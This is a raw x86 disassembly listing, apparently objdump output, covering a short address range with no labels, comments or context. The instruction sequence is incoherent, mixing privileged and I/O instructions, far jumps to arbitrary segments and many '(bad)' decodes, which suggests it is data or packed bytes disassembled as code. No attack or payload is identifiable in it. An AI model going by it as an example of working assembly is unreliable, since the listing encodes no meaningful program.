  40719e:	jp     0x4071fc
  4071a0:	dec    ebp
  4071a1:	lods   al,BYTE PTR ds:[esi]
  4071a2:	pop    si
  4071a4:	sbb    DWORD PTR [eax+ecx*4+0x1619d160],ebp
  4071ab:	jne    0x4071ef
  4071ad:	mov    bl,0x0
  4071af:	mov    ebx,0x9c3eeed
  4071b4:	xchg   ebp,eax
  4071b5:	lock xchg BYTE PTR ds:[edx-0x7d017232],ch
  4071bd:	sahf   
  4071be:	pop    eax
  4071bf:	ret    0xc801
  4071c2:	jmp    0x4071b2
  4071c4:	mov    dh,0xaf
  4071c6:	sub    BYTE PTR [esi+0x2ff11f2],0xf4
  4071cd:	jns    0x4071d8
  4071cf:	sar    DWORD PTR [eax-0x3a81ebe7],0xd3
  4071d6:	pop    edi
  4071d7:	add    ebx,esi
  4071d9:	push   ebp
  4071da:	jo     0x407227
  4071dc:	push   esp
  4071dd:	lds    edi,FWORD PTR ds:[eax+0x75a92aa1]
  4071e4:	pop    esi
  4071e5:	and    DWORD PTR [esi-0x35],edi
  4071e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071e9:	sti    
  4071ea:	xchg   ebp,eax
  4071eb:	xor    al,0xe0
  4071ed:	cmovbe ebx,esp
  4071f0:	xchg   edi,eax
  4071f1:	jne    0x40723c
  4071f3:	sbb    bh,BYTE PTR [eax]
  4071f5:	fcmovne st,st(4)
  4071f7:	pusha  
  4071f8:	pop    esp
  4071f9:	in     eax,0x21
  4071fb:	iret   
  4071fc:	xlat   BYTE PTR ds:[ebx]
  4071fd:	add    eax,0x3e8b2b94
  407202:	dec    esp
  407203:	std    
  407204:	mov    dh,0x39
  407206:	arpl   WORD PTR [edi-0x3c],di
  407209:	xchg   edi,eax
  40720a:	outs   dx,DWORD PTR ds:[esi]
  40720b:	scas   eax,DWORD PTR es:[edi]
  40720c:	out    dx,al
  40720d:	dec    ebp
  40720e:	and    BYTE PTR ds:0x54b46761,0x8f
  407215:	data16 stc 
  407217:	pop    ds
  407218:	jno    0x4071ea
  40721a:	imul   ebx,DWORD PTR [edx-0x73],0xcbb60f45
  407221:	sub    BYTE PTR [edx+0xdae3bca],0x14
  407228:	adc    BYTE PTR [esi],ch
  40722a:	pop    esi
  40722b:	add    eax,0x375b062a
  407230:	mov    al,0x11
  407232:	xchg   ebp,eax
  407233:	(bad)  
  407234:	sti    
  407235:	icebp  
  407236:	(bad)  
  407237:	xchg   DWORD PTR [edx],edx
  407239:	push   ecx
  40723a:	inc    esp
  40723b:	add    edi,DWORD PTR [esi+0x76]
  40723e:	adc    ebx,ecx
  407240:	retf   
  407241:	mov    ds:0x27fad404,eax
  407246:	inc    ebp
  407247:	clc    
  407248:	sahf   
  407249:	out    dx,al
  40724a:	jg     0x407297
  40724c:	jg     0x407227
  40724e:	pushf  
  40724f:	fisubr WORD PTR [edi+0x68417c1b]
  407255:	mov    edi,0x35b42b37
  40725a:	mov    al,0x7d
  40725c:	addr16 inc esi
  40725e:	cmp    eax,0x3ef4d230
  407263:	jmp    0xdf3c:0xecb594f8
  40726a:	test   BYTE PTR [eax],0x6b
  40726d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40726e:	stos   DWORD PTR es:[edi],eax
  40726f:	mov    BYTE PTR [ebp+0x67d28684],bl
  407275:	or     ah,BYTE PTR [ecx-0x167c272]
  40727b:	cmc    
  40727c:	and    al,BYTE PTR [edx]
  40727e:	imul   eax,eax,0xc80c7d46
  407284:	mov    ebx,0x148472d3
  407289:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40728a:	out    dx,al
  40728b:	or     al,0x7a
  40728d:	cmp    BYTE PTR [edx+0xec12b3d],bl
  407293:	mov    edx,0x1d5205cc
  407298:	xor    ch,dh
  40729a:	fsubp  st(1),st
  40729c:	dec    edx
  40729d:	adc    eax,0x9239f1f0
  4072a2:	or     al,0x24
  4072a4:	cmp    eax,0x8d1151f
  4072a9:	cli    
  4072aa:	adc    ebx,DWORD PTR [esi+0x34]
  4072ad:	mov    al,0x5d
  4072af:	mov    WORD PTR [ecx-0x625e2a67],ds
  4072b5:	imul   esp,DWORD PTR [ecx-0x15],0xffffffb3
  4072b9:	push   esi
  4072ba:	sar    DWORD PTR [eax+0x5],1
  4072bd:	daa    
  4072be:	not    BYTE PTR [esi]
  4072c0:	add    cl,cl
  4072c2:	mov    esi,edx
  4072c4:	jl     0x407305
  4072c6:	add    DWORD PTR [edx+0x13f7599d],esp
  4072cc:	ret    0x1c39
  4072cf:	mov    bl,0xe0
  4072d1:	cmp    DWORD PTR [esi],ecx
  4072d3:	mov    bh,0x1b
  4072d5:	lods   al,BYTE PTR ds:[esi]
  4072d6:	or     eax,0x53e6c366
  4072db:	loope  0x40733d
  4072dd:	fisubr WORD PTR [ebx-0xdb70170]
  4072e3:	sub    eax,0x235af328
  4072e8:	ss inc eax
  4072ea:	mov    dl,0x85
  4072ec:	in     eax,0x3d
  4072ee:	div    BYTE PTR [ecx+0x45c23081]
  4072f4:	aam    0x59
  4072f6:	stos   BYTE PTR es:[edi],al
  4072f7:	outs   dx,DWORD PTR ds:[esi]
  4072f8:	das    
  4072f9:	sub    eax,0xcabf27f7
  4072fe:	repz fdivr st,st(4)
  407301:	mov    dh,0x41
  407303:	stos   BYTE PTR es:[edi],al
  407304:	mov    edi,0x713507e7
  407309:	cmp    DWORD PTR [ecx],ebp
  40730b:	dec    esp
  40730c:	xchg   ebp,eax
  40730d:	mov    bh,0x71
  40730f:	adc    al,0xb1
  407311:	adc    DWORD PTR [ebx+0x6aab876e],eax
  407317:	adc    al,0xfb
  407319:	push   es
  40731a:	add    bh,ah
  40731c:	fnstsw WORD PTR [ebx+0x6d]
  40731f:	mov    eax,ds:0x8aaff26f
  407324:	add    DWORD PTR ds:[ebx+0x25],edi
  407328:	jp     0x4072dd
  40732a:	inc    edx
  40732b:	or     al,0x83
  40732d:	push   ss
  40732e:	sub    DWORD PTR ds:0x2eb0ab5d,ebp
  407334:	out    0xb8,al
  407336:	scas   al,BYTE PTR es:[edi]
  407337:	repz adc al,BYTE PTR [eax+0xd]
  40733b:	add    DWORD PTR [esi],0x6586f4b2
  407341:	jp     0x407313
  407343:	inc    ecx
  407344:	mov    BYTE PTR [ebp+0x6ce6bcce],bh
  40734a:	shl    DWORD PTR [ecx-0x64],1
  40734d:	fisubr WORD PTR [ecx-0xc]
  407350:	out    0xcf,eax
  407352:	popf   
  407353:	inc    ebx
  407354:	pusha  
  407355:	into   
  407356:	adc    eax,esi
  407358:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407359:	inc    esi
  40735a:	jbe    0x40737e
  40735c:	cmp    BYTE PTR [esi],0xa6
  40735f:	pop    ecx
  407361:	inc    eax
  407362:	fist   WORD PTR [ebx-0x63]
  407365:	and    al,BYTE PTR [edi+ebp*2-0x5f]
  407369:	mov    edi,0x7a61e843
  40736e:	push   ebp
  40736f:	sub    ah,ch
  407371:	jne    0x40731e
  407373:	mov    edx,0x7acfd6b3
  407378:	push   edi
  407379:	jbe    0x407307
  40737b:	cmp    DWORD PTR [ebp-0x66],ecx
  40737e:	stos   DWORD PTR es:[edi],eax
  40737f:	cdq    
  407380:	mov    ebx,0xdecbe3c0
  407385:	popa   
  407386:	push   ss
  407387:	xlat   BYTE PTR ds:[ebx]
  407388:	sub    ah,BYTE PTR [ebx]
  40738a:	(bad)  
  40738b:	pop    edx
  40738c:	leave  
  40738d:	retf   
  40738e:	pop    eax
  40738f:	sbb    eax,0x9cc3868c
  407394:	mov    eax,ds:0xf6ae5dc1
  407399:	jge    0x4073e6
  40739b:	mov    ah,0xc
  40739d:	sti    
  40739e:	inc    edx
  40739f:	lock push edi
  4073a1:	xchg   edx,eax
  4073a2:	pop    edx
  4073a3:	add    BYTE PTR [ebx],0xa1
  4073a6:	xor    DWORD PTR [ebp-0x33],edi
  4073a9:	pop    edi
  4073aa:	fistp  QWORD PTR [esi]
  4073ac:	adc    eax,0x7e923870
  4073b1:	call   0xcd76:0x7de6caad
  4073b8:	cmp    edi,ecx
  4073ba:	cwde   
  4073bb:	jns    0x4073dc
  4073bd:	cmp    esi,DWORD PTR [ebp-0x67c0bc7c]
  4073c3:	int3   
  4073c4:	dec    esi
  4073c5:	mov    ah,0xab
  4073c7:	xor    ch,dh
  4073c9:	add    BYTE PTR [eax-0x703f1d38],dl
  4073cf:	mov    esi,DWORD PTR [ebp+eiz*8-0x3d2964c2]
  4073d6:	xlat   BYTE PTR ds:[ebx]
  4073d7:	or     eax,0xbcaf8392
  4073dc:	stc    
  4073dd:	or     eax,0xe6088527
  4073e2:	lds    eax,FWORD PTR [esp+esi*1-0x1a]
  4073e6:	scas   eax,DWORD PTR es:[edi]
  4073e7:	aas    
  4073e8:	cmp    bh,BYTE PTR [ecx+eiz*1]
  4073eb:	cmp    cl,0x52
  4073ee:	or     bl,BYTE PTR [eax+0x11]
  4073f1:	sbb    ch,BYTE PTR [eax+0x48]
  4073f4:	lea    esi,[edi+0x35]
  4073f7:	repz jmp 0x55e1:0x5fb4712b
  4073ff:	xchg   edi,eax
  407400:	hlt    
  407401:	sub    al,0x25
  407403:	and    BYTE PTR [esi],bh
  407405:	cmovbe ebp,DWORD PTR [eax-0x2552904c]
  40740c:	jle    0x407487
  40740e:	mov    gs,WORD PTR [edi]
  407410:	bswap  ebx
  407412:	test   BYTE PTR [edx],dh
  407414:	dec    ebx
  407415:	mov    bh,0xae
  407417:	repz fnstenv [esi+0x17]
  40741b:	sti    
  40741c:	sar    DWORD PTR [ebx+0x316fb6b1],cl
  407422:	cmp    BYTE PTR [ebp-0x17fe4145],dh
  407428:	mov    cl,0x10
  40742a:	neg    BYTE PTR [edi+0x5e4d8a0a]
  407430:	pop    es
  407431:	int    0x25
  407433:	push   ds
  407434:	inc    eax
  407435:	stos   BYTE PTR es:[edi],al
  407436:	dec    edx
  407437:	adc    ah,BYTE PTR [ecx+0x10]
  40743a:	mov    edi,0x4219dc75
  40743f:	les    edi,FWORD PTR [edi]
  407441:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407442:	rol    DWORD PTR [edi-0x60],0xd3
  407446:	add    eax,0x2c595e75
  40744b:	dec    edx
  40744c:	scas   al,BYTE PTR es:[edi]
  40744d:	inc    esi
  40744e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40744f:	outs   dx,BYTE PTR ds:[esi]
  407450:	daa    
  407451:	and    BYTE PTR [ebx],0x4b
  407454:	ret    0x7f27
  407457:	dec    esi
  407458:	mov    edx,0x65bb865b
  40745d:	stos   BYTE PTR es:[edi],al
  40745e:	mov    ds:0xe2a831eb,al
  407463:	pushf  
  407464:	dec    edx
  407465:	stc    
  407466:	dec    edx
  407467:	inc    ecx
  407468:	inc    esi
  407469:	cmc    
  40746a:	out    dx,al
  40746b:	mov    ebx,0xca9ebf78
  407470:	lods   eax,DWORD PTR ds:[esi]
  407471:	aad    0x17
  407473:	inc    esp
  407474:	pop    ds
  407475:	(bad)  
  407476:	mov    BYTE PTR [ebp-0x67],0xd4
  40747a:	icebp  
  40747b:	add    eax,0x68fbccf9
  407480:	int    0xaa
  407482:	push   ebx
  407483:	xor    ch,0xac
  407486:	push   esp
  407487:	daa    
  407488:	lds    edx,FWORD PTR [ecx]
  40748a:	out    dx,eax
  40748b:	ss loope 0x4074eb
  40748e:	push   ebp
  40748f:	dec    ebx
  407490:	push   edx
  407491:	pop    es
  407492:	dec    ebp
  407493:	and    dl,BYTE PTR [edi+0x7666844a]
  407499:	lock jecxz 0x407485
  40749c:	ss inc esi
  40749e:	fucomi st,st(4)
  4074a0:	and    al,0x57
  4074a2:	(bad)  
  4074a3:	aam    0xf5
  4074a5:	lds    eax,FWORD PTR [ebp+ecx*2+0x12]
  4074a9:	neg    BYTE PTR [ebp-0x1d4eeec1]
  4074af:	push   cs
  4074b0:	push   0xe7e6a77d
  4074b5:	cmp    cl,BYTE PTR [ecx+0x62]
  4074b8:	jmp    0x40745a
  4074ba:	inc    ebx
  4074bb:	dec    edx
  4074bc:	shl    DWORD PTR [edi+0x2],cl
  4074bf:	push   ss
  4074c0:	push   esp
  4074c1:	xor    esi,ebp
  4074c3:	fsub   DWORD PTR [ecx+edx*4]
  4074c6:	retf   
  4074c7:	mov    ah,0x6c
  4074c9:	sti    
  4074ca:	repz pop sp
  4074cd:	pop    edi
  4074ce:	out    0x63,al
  4074d0:	sub    esp,DWORD PTR [edx-0x2c]
  4074d3:	lods   eax,DWORD PTR ds:[esi]
  4074d4:	push   ebx
  4074d5:	dec    eax
  4074d6:	jae    0x407503
  4074d8:	dec    BYTE PTR [ecx+0x4a]
  4074db:	mov    cl,0x29
  4074dd:	loopne 0x4074a8
  4074df:	lods   eax,DWORD PTR ds:[esi]
  4074e0:	inc    ecx
  4074e1:	ja     0x407528
  4074e3:	mov    edx,DWORD PTR [esi-0x40643887]
  4074e9:	repnz les edi,FWORD PTR [eax+eiz*4+0x1d8e590d]
  4074f1:	or     ah,dh
  4074f3:	pushf  
  4074f4:	adc    al,0x6c
  4074f6:	inc    edi
  4074f7:	clc    
  4074f8:	pop    ebx
  4074f9:	and    bh,BYTE PTR [edi-0x69ca423e]
  4074ff:	fcomp  QWORD PTR [ebp-0x22c18b85]
  407505:	or     DWORD PTR [edi-0x5b],0x90ea8588
  40750c:	and    BYTE PTR [esi],ch
  40750e:	sbb    DWORD PTR [ecx+0x1827d5b3],0x1
  407515:	jg     0x40750b
  407517:	(bad)  
  407518:	push   cs
  407519:	mov    bh,0x38
  40751b:	div    DWORD PTR [ebx]
  40751d:	inc    ebp
  40751e:	mov    al,0x83
  407520:	popa   
  407521:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407522:	and    al,0x53
  407524:	mov    ebp,0xf63868f9
  407529:	fsubr  DWORD PTR [edx-0x19c744d0]
  40752f:	fwait
  407530:	icebp  
  407531:	sub    al,0xbb
  407533:	or     al,0xb5
  407535:	popf   
  407536:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407537:	sbb    ebx,DWORD PTR [ebp+0x70133b4f]
  40753d:	xchg   BYTE PTR [edi],ch
  40753f:	fadd   st,st(0)
  407541:	(bad)  
  407542:	lods   al,BYTE PTR ds:[esi]
  407543:	xor    DWORD PTR [ecx+0x1473b7d6],ebx
  407549:	into   
  40754a:	jle    0x4075cb
  40754c:	les    esi,FWORD PTR [ecx-0x21dc9ec]
  407552:	sub    al,0x3b
  407554:	addr16 aas 
  407556:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407557:	jne    0x407554
  407559:	jecxz  0x40752b
  40755b:	jbe    0x4075b2
  40755d:	ror    DWORD PTR [eax+0x17],0x85
  407561:	mov    eax,ds:0xdda14f09
  407566:	sahf   
  407567:	cli    
  407568:	push   ecx
  407569:	aas    
  40756a:	inc    ebx
  40756b:	mov    ds:0x5d8148aa,eax
  407570:	mov    ah,0x25
  407572:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407573:	shl    al,cl
  407575:	mov    DWORD PTR [edx-0x4693c6b1],0x4bbb927e
  40757f:	jo     0x407511
  407581:	jmp    0x4075cf
  407583:	xchg   edi,eax
  407584:	mov    ecx,edi
  407586:	or     eax,0xda65da0a
  40758b:	sub    al,0x75
  40758d:	pop    ds
  40758e:	cdq    
  40758f:	enter  0xc4d,0x5d
  407593:	mov    dl,0x2d
  407595:	mov    ch,0x93
  407597:	and    eax,0x53d910a4
  40759c:	dec    esi
  40759d:	cs add al,0xad
  4075a0:	jae    0x4075fa
  4075a2:	arpl   WORD PTR fs:[ebp-0x15],bx
  4075a6:	loope  0x4075ee
  4075a8:	cmp    DWORD PTR ds:0x21d20c8d,edx
  4075ae:	adc    DWORD PTR [esp],esp
  4075b1:	jns    0x407614
  4075b3:	int3   
  4075b4:	cs pop ebp
  4075b6:	rcr    BYTE PTR [esi-0x3e],1
  4075b9:	mov    es,WORD PTR [ebx+0xa]
  4075bc:	enter  0xca80,0x7c
  4075c0:	gs data16 or al,0x66
  4075c4:	fcmovne st,st(7)
  4075c6:	inc    edx
  4075c7:	or     edi,esi
  4075c9:	dec    ebp
  4075ca:	cmp    eax,0x64f280a3
  4075cf:	sbb    BYTE PTR [edx],0x79
  4075d2:	sbb    DWORD PTR [ecx],ecx
  4075d4:	add    dl,BYTE PTR [ecx+ebx*4-0x7a1792f0]
  4075db:	or     DWORD PTR [ebx],ecx
  4075dd:	int3   
  4075de:	xchg   ebp,eax
  4075df:	sysenter 
  4075e1:	gs jp  0x407620
  4075e4:	in     al,dx
  4075e5:	pushfw 
  4075e7:	push   cs
  4075e8:	inc    esp
  4075e9:	lods   eax,DWORD PTR ds:[esi]
  4075ea:	mov    DWORD PTR [ecx],ebp
  4075ec:	add    eax,0x624b9e00
  4075f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4075f2:	pop    ecx
  4075f3:	(bad)  
  4075f4:	jns    0x40761d
  4075f6:	ret    0xe582
  4075f9:	cld    
  4075fa:	outs   dx,BYTE PTR ds:[esi]
  4075fb:	popf   
  4075fc:	cmc    
  4075fd:	aaa    
  4075fe:	dec    eax
  4075ff:	test   eax,0x1392ceaf
  407604:	dec    esi
  407605:	xlat   BYTE PTR ds:[ebx]
  407606:	(bad)  
  407607:	imul   eax,DWORD PTR [edi],0x3dfd0e11
  40760d:	aas    
  40760e:	mov    dh,0x7c
  407610:	and    edi,ecx
  407612:	ins    BYTE PTR es:[edi],dx
  407613:	jge    0x407688
  407615:	cmp    al,0x15
  407617:	call   FWORD PTR [ebp-0x380a0367]
  40761d:	inc    ebp
  40761e:	je     0x4075d8
  407620:	ds jo  0x4075b7
  407623:	add    ah,bl
  407625:	lods   eax,DWORD PTR ds:[esi]
  407626:	jb     0x4075df
  407628:	xchg   DWORD PTR [ebx],ebp
  40762a:	repz jg 0x40769b
  40762d:	out    dx,eax
  40762e:	xlat   BYTE PTR ds:[ebx]
  40762f:	or     BYTE PTR [eax+ebx*1-0x33737ced],0x7f
  407637:	sar    BYTE PTR [ebx+0x54519885],0xe2
  40763e:	pop    es
  40763f:	not    DWORD PTR [edx+ebx*8-0x18478ce2]
  407646:	imul   edi,DWORD PTR [eax-0x3da30b3d],0x2c569489
  407650:	sub    esp,ecx
  407652:	fimul  WORD PTR [eax]
  407654:	ja     0x40765e
  407656:	pusha  
  407657:	xor    dh,BYTE PTR [edx+0x37]
  40765a:	mov    ds:0x4d754c80,al
  40765f:	fsubp  st(3),st
  407661:	push   ebp
  407662:	cmp    al,0x6c
  407664:	int3   
  407665:	inc    ebx
  407666:	push   esp
  407667:	dec    ebx
  407668:	clc    
  407669:	jl     0x4076e2
  40766b:	inc    edx
  40766c:	cld    
  40766d:	pushf  
  40766e:	iret   
  40766f:	repz add DWORD PTR [ecx-0x75],0xc76831ca
  407677:	push   ss
  407678:	inc    ebx
  407679:	pop    ecx
  40767a:	sahf   
  40767b:	pop    esp
  40767c:	mov    bl,0xa4
  40767e:	in     eax,0x3b
  407680:	(bad)  
  407681:	push   ss
  407682:	scas   eax,DWORD PTR es:[edi]
  407683:	pop    ebx
  407684:	xor    eax,0x10262533
  407689:	add    cl,ch
  40768b:	mov    ecx,0x7becf21d
  407690:	adc    dl,dh
  407692:	add    eax,0x39f132cf
  407697:	aam    0xcf
  407699:	mov    bl,0xf8
  40769b:	and    al,ah
  40769d:	adc    eax,edi
  40769f:	cmp    BYTE PTR [ebp-0x76],0xa1
  4076a3:	call   0x5a04b11d
  4076a8:	dec    DWORD PTR [ebp+ebx*8-0x1]
  4076ac:	sar    DWORD PTR [esi+0x232676ee],1
  4076b2:	dec    ebp
  4076b3:	mov    al,ds:0xc5b678e4
  4076b8:	and    DWORD PTR [edx-0x3b],esi
  4076bb:	sbb    esi,esi
  4076bd:	push   esi
  4076be:	imul   eax,DWORD PTR [ebx],0xffffffb8
  4076c1:	and    ebp,ebx
  4076c3:	jnp    0x40773f
  4076c5:	push   cs
  4076c6:	test   DWORD PTR [edi-0x41],eax
  4076c9:	idiv   BYTE PTR [ebp+0x2c4a6a53]
  4076cf:	pop    edx
  4076d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4076d1:	mov    dh,0x14
  4076d3:	fiadd  WORD PTR [ebp-0xf]
  4076d6:	(bad)  
  4076d7:	cdq    
  4076d8:	cmc    
  4076d9:	pop    ebp
  4076da:	cmp    al,0x28
  4076dc:	jge    0x407759
  4076de:	xor    al,0xba
  4076e0:	sub    bh,al
  4076e2:	adc    eax,0xc4850685
  4076e7:	cwde   
  4076e8:	mov    esi,DWORD PTR [ebp+0x22]
  4076eb:	aas    
  4076ec:	cdq    
  4076ed:	imul   edi,DWORD PTR [ecx+0x223cef37],0xb1aeeb3a
  4076f7:	imul   ebx,DWORD PTR [eax-0x467f2f3],0xffffffff
  4076fe:	jl     0x407741
  407700:	pusha  
  407701:	pop    ebx
  407702:	lea    eax,[edi]
  407704:	test   al,0x56
  407706:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407707:	xor    BYTE PTR [ebx-0x7a],0xca
  40770b:	sti    
  40770c:	pop    ebx
  40770d:	xor    BYTE PTR [ecx-0x26],bl
  407710:	inc    esp
  407711:	pop    ebx
  407712:	xor    al,0x30
  407714:	xor    al,0xa
  407716:	mov    ecx,0xb9e3000c
  40771b:	das    
  40771c:	sub    eax,0x53f1858d
  407721:	or     edx,DWORD PTR ds:0x6ebdfe1d
  407727:	ror    esp,cl
  407729:	mov    al,ds:0x1f738ca1
  40772e:	sbb    ch,cl
  407730:	ret    0xf62f
  407733:	dec    ecx
  407734:	and    DWORD PTR [edi],ecx
  407736:	push   0x2e7183c
  40773b:	jo     0x4076d5
  40773d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40773e:	xchg   DWORD PTR [eax-0xc],ecx
  407741:	ss or  al,0x69
  407744:	xor    BYTE PTR [esi],bl
  407746:	inc    edx
  407747:	sub    eax,DWORD PTR [edx]
  407749:	xchg   ebp,eax
  40774b:	es xchg edi,eax
  40774d:	jge    0x40774d
  40774f:	mov    dl,0x78
  407751:	xchg   DWORD PTR [eax-0x66396672],ebp
  407757:	retf   
  407758:	mov    ch,0x8
  40775a:	dec    ecx
  40775b:	out    dx,eax
  40775c:	das    
  40775d:	outs   dx,BYTE PTR ds:[esi]
  40775e:	jb     0x4077b8
  407760:	scas   eax,DWORD PTR es:[edi]
  407761:	and    ch,BYTE PTR [eax+0x32]
  407764:	adc    eax,0x88680718
  407769:	mov    ds:0xebdce10f,al
  40776e:	cmp    al,0xfe
  407770:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407771:	dec    DWORD PTR [ecx-0x67]
  407774:	shr    BYTE PTR [ebx+0x33],0xa4
  407778:	pop    ecx
  407779:	ret    
  40777a:	out    0x3,al
  40777c:	jae    0x407710
  40777e:	xchg   esp,ebx
  407780:	jnp    0x4077c7
  407782:	inc    esp
  407783:	push   edi
  407784:	adc    ebp,esp
  407786:	(bad)  
  407787:	pop    edi
  407788:	jle    0x40774e
  40778a:	mov    dl,BYTE PTR [ebx-0x18553e6f]
  407790:	repnz outs dx,DWORD PTR ds:[esi]
  407792:	popa   
  407793:	stos   BYTE PTR es:[edi],al
  407794:	and    al,al
  407796:	fld    DWORD PTR [esp+eax*1+0xa]
  40779a:	xchg   DWORD PTR ds:0x329151c7,ecx
  4077a0:	les    eax,FWORD PTR [ebx]
  4077a2:	cmp    bl,BYTE PTR [esi]
  4077a4:	push   cs
  4077a5:	lahf   
  4077a6:	sahf   
  4077a7:	jno    0x407790
  4077a9:	cmp    edx,esi
  4077ab:	dec    ebx
  4077ac:	stos   DWORD PTR es:[edi],eax
  4077ad:	xchg   edi,eax
  4077ae:	dec    edx
  4077af:	cmp    eax,0x9d1a61b6
  4077b4:	jp     0x407814
  4077b6:	dec    ebx
  4077b7:	inc    ebx
  4077b8:	add    dl,ah
  4077ba:	nop
  4077bb:	mov    cl,0x78
  4077bd:	outs   dx,BYTE PTR ds:[esi]
  4077be:	sbb    DWORD PTR [ecx+esi*2+0x51],esp
  4077c2:	loopne 0x407823
  4077c4:	inc    ecx
  4077c5:	addr16 inc ebx
  4077c7:	shl    ecx,1
  4077c9:	sbb    BYTE PTR [esi-0x11],bh
  4077cc:	pop    es
  4077cd:	mov    dh,0xac
  4077cf:	rol    DWORD PTR [edi-0x43],1
  4077d2:	popf   
  4077d3:	and    ebp,eax
  4077d5:	gs and al,0xc
  4077d8:	mov    esp,ss
  4077da:	xor    esp,edi
  4077dc:	inc    edx
  4077dd:	ds add eax,0xf0c0ff19
  4077e3:	scas   al,BYTE PTR es:[edi]
  4077e4:	inc    esi
  4077e5:	retw   
  4077e7:	inc    esi
  4077e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077e9:	dec    ebp
  4077ea:	rdmsr  
  4077ec:	out    0x37,eax
  4077ee:	inc    edi
  4077ef:	mov    BYTE PTR [ebx-0x67],dh
  4077f2:	fs pop ecx
  4077f4:	pop    esi
  4077f5:	leave  
  4077f6:	pop    ebp
  4077f7:	pushf  
  4077f8:	popa   
  4077f9:	cmp    cl,BYTE PTR [edi-0x1c]
  4077fc:	mov    bl,0x3b
  4077fe:	mov    edi,0x556ff24c
  407803:	stos   BYTE PTR es:[edi],al
  407804:	pushf  
  407805:	call   0x73f9221c
  40780a:	das    
  40780b:	loope  0x407829
  40780d:	sbb    al,0xc1
  40780f:	aas    
  407810:	shl    BYTE PTR [ebx-0x5a43bb05],1
  407816:	sub    ah,ch
  407818:	adc    eax,0x6e1dddad
  40781d:	and    al,BYTE PTR [ebp+0x2a]
  407820:	mov    dh,0x17
  407822:	lods   eax,DWORD PTR ds:[esi]
  407823:	pop    es
  407824:	sbb    ebp,esp
  407826:	xlat   BYTE PTR ds:[ebx]
  407827:	ss std 
  407829:	ficomp WORD PTR [ecx-0x7050f43a]
  40782f:	add    BYTE PTR [ebp+0x2d330807],bl
  407835:	mov    bh,0x3b
  407837:	push   esp
  407838:	adc    al,0xdc
  40783a:	pop    ecx
  40783b:	popa   
  40783c:	jle    0x40780c
  40783e:	cs sti 
  407840:	in     eax,dx
  407841:	aas    
  407842:	sub    esp,DWORD PTR [ecx]
  407844:	push   cs
  407845:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407846:	and    ah,BYTE PTR [esi-0x21ff56e]
  40784c:	cmp    ecx,DWORD PTR [esi]
  40784e:	call   0x1dd66be3
  407853:	lods   eax,DWORD PTR ds:[esi]
  407854:	in     al,0x2b
  407856:	pop    ebx
  407857:	sbb    ch,BYTE PTR [esi]
  407859:	es push ds
  40785b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40785c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40785d:	mov    ebx,0x3f8cb800
  407862:	dec    edx
  407863:	xchg   ebx,eax
  407864:	jo     0x407860
  407866:	int3   
  407867:	mov    cl,0xf9
  407869:	fnsave [ecx]
  40786b:	fcomp  QWORD PTR [ebp+0x18]
  40786e:	test   eax,0xf2c8b03c
  407873:	aad    0x42
  407875:	bound  esi,QWORD PTR [edx]
  407877:	jmp    0x4312f11e
  40787c:	scas   eax,DWORD PTR es:[edi]
  40787d:	or     BYTE PTR ss:[ebx],cl
  407880:	fs mov edx,0xafb7f812
  407886:	outs   dx,DWORD PTR ds:[esi]
  407887:	xchg   BYTE PTR [edi],bl
  407889:	dec    ebp
  40788a:	(bad)  
  40788b:	or     eax,0x2b66e881
  407890:	or     ah,al
  407892:	dec    ebx
  407893:	sbb    cl,bl
  407895:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407896:	xchg   esi,eax
  407897:	add    BYTE PTR [ecx],ch
  407899:	xchg   esp,eax
  40789a:	lods   eax,DWORD PTR ds:[esi]
  40789b:	jb     0x407884
  40789d:	mov    edi,0xc812c7d0
  4078a2:	jae    0x407888
  4078a4:	pop    edi
  4078a5:	pop    edi
  4078a6:	xor    eax,0x5b91e580
  4078ab:	jmp    0x2be07607
  4078b0:	mov    ecx,0xe7bb4dd5
  4078b5:	jp     0x40789a
  4078b7:	adc    BYTE PTR [edx],ch
  4078b9:	(bad)  
  4078ba:	pusha  
  4078bb:	jl     0x4078a2
  4078bd:	stc    
  4078be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4078bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4078c0:	add    DWORD PTR [eax+ebp*1-0x2fc48922],edx
  4078c7:	sar    DWORD PTR [esi],cl
  4078c9:	or     eax,0x1bf93566
  4078ce:	sbb    BYTE PTR [ecx+0x20cd679f],bh
  4078d4:	sub    DWORD PTR [eax+esi*4],eax
  4078d7:	shl    DWORD PTR [edi],1
  4078d9:	in     eax,0x1d
  4078db:	add    bl,BYTE PTR [edx+0x32bdcae9]
  4078e1:	lock cld 
  4078e3:	mov    al,ds:0x629d2316
  4078e8:	mov    edi,0x9d6542ef
  4078ed:	retf   0xcf29
  4078f0:	sub    BYTE PTR [eax+ecx*2-0x123a915e],bl
  4078f7:	ins    DWORD PTR es:[edi],dx
  4078f8:	add    BYTE PTR [esi-0x22],bl
  4078fb:	adc    al,0xb7
  4078fd:	cmp    BYTE PTR [ecx],ah
  4078ff:	adc    al,0xea
  407901:	int    0x3a
  407903:	sbb    eax,0x3c33a1df
  407908:	daa    
  407909:	add    eax,0x1931c77a
  40790e:	nop
  40790f:	mov    edi,0xfa63fea5
  407914:	aad    0xe8
  407916:	sub    BYTE PTR [edi],bh
  407918:	mov    edi,0xe8ef0f33
  40791d:	test   eax,0x71d25d30
